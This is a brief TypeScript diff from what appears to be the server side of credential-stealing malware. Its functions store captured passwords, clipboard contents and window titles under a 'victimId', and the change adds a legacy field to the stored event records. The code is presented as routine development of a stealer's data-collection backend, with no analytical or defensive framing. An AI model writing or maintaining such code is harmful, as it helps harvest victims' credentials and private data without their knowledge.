@@ -48,7 +48,7 @@ async function recordClipboard(victimId: string, kind: string, content: string, 
 /** Persist a structured event and mirror it onto the typed tables. */
 export async function applyEvent(victimId: string, event: EventInput): Promise<void> {
   const { kind, data } = event;
-  await prisma.event.create({ data: { victimId, kind, data: data as never } });
+  await prisma.event.create({ data: { victimId, kind, data: data as never, legacy: event.legacy } });
 
   if (kind === 'password') {
     await recordPassword(victimId, text(data.process, 260), text(data.title, 512), text(data.text, 4096) || event.legacy);
